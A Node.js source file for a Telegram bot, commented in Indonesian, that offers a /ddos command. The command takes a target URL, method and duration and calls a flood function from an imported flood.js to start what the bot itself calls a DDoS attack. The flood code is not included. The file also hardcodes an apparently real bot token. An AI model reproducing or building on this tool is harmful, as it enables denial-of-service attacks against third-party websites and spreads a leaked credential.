const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Token bot Telegram yang Anda berikan
const token = '7756951499:AAGnDOalFmL1o-V84mMyPp4bwqX1dGYGgxY';

// Membuat instance bot
const bot = new TelegramBot(token, {polling: true});

// Import flood.js untuk melakukan DDoS
const flood = require('./flood.js');

// Menu utama
const mainMenu = {
  reply_markup: {
    keyboard: [
      ['Metode 1', 'Metode 2'],
      ['Info', 'Exit']
    ],
    one_time_keyboard: true
  }
};

// Fungsi untuk mengirimkan pesan dan menampilkan menu
function showMainMenu(chatId) {
  bot.sendMessage(chatId, 'Pilih metode yang ingin digunakan:', mainMenu);
}

// Menangani pesan yang diterima
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Selamat datang di bot Telegram!', mainMenu);
});

// Menangani input dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text.toLowerCase();

  // Menu utama
  if (text === 'metode 1') {
    bot.sendMessage(chatId, 'Metode 1 dipilih. Menjalankan aksi terkait Metode 1...');
    // Menambahkan logika untuk metode 1 di sini.
  } else if (text === 'metode 2') {
    bot.sendMessage(chatId, 'Metode 2 dipilih. Menjalankan aksi terkait Metode 2...');
    // Menambahkan logika untuk metode 2 di sini.
  } else if (text === 'info') {
    bot.sendMessage(chatId, 'Bot ini memungkinkan Anda untuk memilih berbagai metode dan menjalankan aksi sesuai pilihan.');
  } else if (text === 'exit') {
    bot.sendMessage(chatId, 'Terima kasih telah menggunakan bot ini!');
  } else {
    showMainMenu(chatId);
  }
});

// Menangani command lain yang diberikan oleh pengguna
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Gunakan menu untuk memilih metode atau ketik /start untuk memulai.');
});

// DDoS flood method
bot.onText(/\/ddos (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].split(' ');

  if (params.length !== 3) {
    bot.sendMessage(chatId, 'Perintah tidak valid. Format yang benar: /ddos [url] [methods] [time]');
    return;
  }

  const [target, method, duration] = params;
  const durationNum = parseInt(duration, 10);

  if (isNaN(durationNum)) {
    bot.sendMessage(chatId, 'Durasi harus berupa angka.');
    return;
  }

  // Jalankan flood
  bot.sendMessage(chatId, `Menjalankan serangan DDoS pada ${target} dengan metode ${method} selama ${duration} detik.`);
  flood.flood(target, durationNum, method);

  bot.sendMessage(chatId, 'Serangan DDoS dimulai!');
});
